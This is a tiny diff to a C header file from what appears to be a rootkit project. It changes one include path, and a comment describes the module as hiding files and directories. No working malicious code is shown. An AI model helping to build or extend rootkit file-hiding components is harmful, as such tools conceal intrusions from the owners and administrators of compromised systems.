@@ -5,7 +5,7 @@
 #ifndef ROOTKIT_FILE_HIDING_ACCESS_H
 #define ROOTKIT_FILE_HIDING_ACCESS_H
 
-#include "kernel_access/kernel_access.h"
+#include "../kernel_access/kernel_access.h"
 
 // hides files and directories. this is really useful as almost anything in unix is a file
 
